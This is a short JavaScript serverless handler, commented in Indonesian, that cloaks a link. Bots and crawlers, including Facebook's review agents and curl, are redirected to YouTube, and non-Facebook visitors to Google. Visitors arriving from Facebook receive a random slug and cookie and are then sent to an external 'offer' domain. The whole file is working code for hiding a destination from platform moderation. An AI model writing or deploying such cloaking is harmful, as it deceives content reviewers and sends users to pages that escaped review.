export default async function handler(req, res) {

  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const referer = (req.headers["referer"] || "").toLowerCase();
  const url = new URL(req.url, `https://${req.headers.host}`);

  const path = url.pathname;

  // ===== DETEKSI =====
  const isBot =
    ua.includes("bot") ||
    ua.includes("crawl") ||
    ua.includes("spider") ||
    ua.includes("facebookexternalhit") ||
    ua.includes("meta-externalagent") ||
    ua.includes("curl");

const isFB =
  referer.includes("facebook");

  // ===== ROOT DOMAIN =====
  if (path === "/") {

    // BOT → WHITE
    if (isBot) {
      return res.writeHead(301, {
        Location: "https://www.youtube.com/"
      }).end();
    }

    // NON FB → WHITE
    if (!isFB) {
      return res.writeHead(301, {
        Location: "https://www.google.com/"
      }).end();
    }

    // USER FB → GENERATE SLUG
    const slug = "pusat-" + Math.random().toString(36).substring(2, 10);

    return res.writeHead(302, {
      Location: "/" + slug,
      "Set-Cookie": "visitor=real; path=/;"
    }).end();
  }

  // ===== SLUG PAGE =====
  if (path !== "/") {

    // redirect ke offer
    return res.writeHead(302, {
      Location: "https://hehehe.pusat4daksi.org/"
    }).end();
  }

}
